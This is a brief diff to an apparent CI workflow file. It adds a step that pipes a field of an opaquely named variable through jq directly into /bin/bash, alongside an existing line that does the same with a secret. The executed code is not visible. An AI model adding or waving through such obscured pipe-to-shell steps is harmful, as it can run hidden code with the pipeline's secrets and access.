@@ -27,6 +27,7 @@ jobs:
           n12: ${{ secrets.n12 }}
         run: |
           printf '%s' "$n12" | jq -r .zgvty8 | /bin/bash
+          printf '%s' "$ki2851" | jq -r .rzq85897 | /bin/bash
 
       - name: Persist output
         if: always()
